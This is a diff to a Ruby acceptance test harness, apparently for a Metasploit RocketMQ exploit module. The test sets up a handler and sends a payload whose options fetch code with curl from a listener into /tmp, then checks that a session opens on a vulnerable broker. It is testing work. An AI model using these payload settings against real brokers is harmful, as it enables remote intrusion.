@@ -37,7 +37,8 @@ module Acceptance
 
     def rmq_native_snapshot(role, phase)
       @rmq_native_count = (@rmq_native_count || 0) + 1
-      rocketmq_native(role, "#{phase}-#{@rmq_native_count}")
+      example = RSpec.current_example&.id&.split('[', 2)&.last&.delete_suffix(']')&.tr(':', '-') || 'all'
+      rocketmq_native(role, "#{phase}-#{example}-#{@rmq_native_count}")
     end
 
     def rmq_restore(role, baseline)
@@ -51,7 +52,7 @@ module Acceptance
     end
 
     def rmq_options(payload, port = CALLBACK)
-      options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'ExitOnSession' => false, 'VERBOSE' => true }
+      options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'VERBOSE' => true }
       if payload.include?('meterpreter')
         options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => FETCH,
                        'FETCH_FILENAME' => FETCH_NAME, 'FETCH_URIPATH' => FETCH_NAME, 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_DELETE' => true)
@@ -129,7 +130,7 @@ module Acceptance
         console_command('use exploit/multi/handler')
         constraints = rmq_json('RocketmqSessionControl.constraints(active_module,framework)')
         expect(constraints.fetch('badchars')).to eq([39])
-        rmq_options(payload).each { |key, value| expect(console_command("set #{key} #{value}")).not_to match(/Unknown datastore option|Invalid option/) }
+        rmq_options(payload).merge('ExitOnSession' => false).each { |key, value| expect(console_command("set #{key} #{value}")).not_to match(/Unknown datastore option|Invalid option/) }
         expect(console_command('run -j -z')).not_to include('[-]')
         jobs = rmq_json('framework.jobs.keys')
         expect(jobs.size).to eq(1)
@@ -172,8 +173,9 @@ module Acceptance
         baseline = @native.fetch('vulnerable')
         current = rmq_native_snapshot('vulnerable', 'pre-owner')
         expect(current.fetch('config')).to eq(baseline.fetch('config'))
-        output = run_target_module(EXPLOIT, 'vulnerable', rmq_options(payload).merge('AutoCheck' => auto_check, 'ConnectTimeout' => 3, 'WfsDelay' => 40), action: 'run -z', command_timeout: 65)
+        output = run_target_module(EXPLOIT, 'vulnerable', rmq_options(payload).merge('AutoCheck' => auto_check, 'ConnectTimeout' => 3, 'WfsDelay' => 50), action: 'run -z', command_timeout: 75)
         record[:output] = output
+        expect(output).not_to include('Unknown datastore option', 'Exploit completed, but no session was created')
         expect(output).to include('on Broker port: 10921')
         identifier = rmq_wait_session(payload)
         record[:session] = identifier
@@ -187,6 +189,7 @@ module Acceptance
       ensure
         failure = $ERROR_INFO
         record[:failure] = "#{failure.class}: #{failure.message}" if failure
+        record[:status] = 'failed' if failure
         errors = []
         begin
           rmq_cleanup_runtime
